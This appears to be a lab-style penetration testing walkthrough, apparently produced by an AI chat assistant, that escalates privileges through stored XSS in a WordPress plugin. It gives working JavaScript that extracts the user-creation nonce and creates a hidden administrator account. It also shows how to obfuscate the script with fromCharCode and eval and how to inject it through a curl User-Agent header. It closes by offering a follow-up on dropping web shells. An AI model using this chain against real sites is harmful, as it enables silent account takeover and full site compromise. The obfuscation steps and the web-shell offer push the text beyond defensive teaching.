
# Privilege Escalation via Stored XSS in WordPress

## 🧩 Scenario Overview

- **Target Website:** http://pentestlab.local
- **Vulnerability:** Stored XSS in WordPress plugin (e.g., "SiteStats")
- **Goal:** Escalate privileges by creating a new admin user
- **Techniques Used:**
  - XSS + DOM access
  - CSRF bypass via nonce capture
  - JavaScript payload injection
  - Cookie security evaluation

---

## 🔍 Recon & Initial XSS Discovery

1. Discovered a **Stored XSS** vulnerability via input field in the “SiteStats” plugin.
2. Payload successfully executed when **admin** user views the plugin dashboard.

---

## 🍪 Step 1: Check for Cookie Theft Possibility

- Inspect cookies after admin login:
  - Navigate to `Dev Tools > Storage > Cookies > http://pentestlab.local`
  - Observed that session cookies are marked `HttpOnly` and `Secure`.
- ✅ Cookies **cannot** be stolen via JavaScript due to security flags.

---

## 🛠️ Step 2: Use XSS for Admin Account Creation

Instead of cookie theft, use JavaScript to:

- **Fetch WordPress nonce** from `/wp-admin/user-new.php`
- **POST request** to create a new admin user

---

## 🧬 Step 3: JavaScript Payload Breakdown

### 📌 Fetch Admin Nonce
```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
````

### 👤 Create Admin User

```js
var params = "action=createuser&_wpnonce_create-user=" + nonce + 
"&user_login=h4x0r&email=h4x0r@pentestmail.com&pass1=H4x0rPass123&pass2=H4x0rPass123&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

---

## 🧹 Step 4: Minify and Encode the Payload

1. Use [jscompress.com](https://jscompress.com/) to minify the code.
2. Encode payload using this function:

```js
function encode_to_javascript(str) {
    let output = '';
    for (let i = 0; i < str.length; i++) {
        output += str.charCodeAt(i);
        if (i !== str.length - 1) output += ',';
    }
    return output;
}
```

3. Decode and run using:
```js
eval(String.fromCharCode(/* comma-separated values here */));
```

---

## 🎯 Step 5: Deliver Payload via curl + Burp

```bash
curl -i http://pentestlab.local \
-H 'User-Agent: <script>eval(String.fromCharCode(101,120,...));</script>' \
--proxy 127.0.0.1:8080
```

- Send this request with Burp Intercept ON to review and forward.
- Payload is now stored in the database.

---

## ✅ Step 6: Trigger Payload Execution

1. Login as `admin` user
2. Navigate to `SiteStats > Dashboard`
3. Script is executed silently
4. Confirm new admin user in `Users` section:
    - Username: `h4x0r`
    - Role: `Administrator`

---

## 🔚 Conclusion

This XSS vulnerability allowed privilege escalation by:

- Bypassing CSRF protections via nonce extraction
- Leveraging the authenticated session of the admin
- Creating a persistent admin account for full WordPress control

---

> 🔐 **Note:** Always validate user input and apply HttpOnly & Secure cookie flags. Avoid exposing sensitive pages to JavaScript-based scraping without proper access controls.

```

Let me know if you’d like this turned into a printable PDF or want a follow-up section on dropping web shells via custom plugins.
```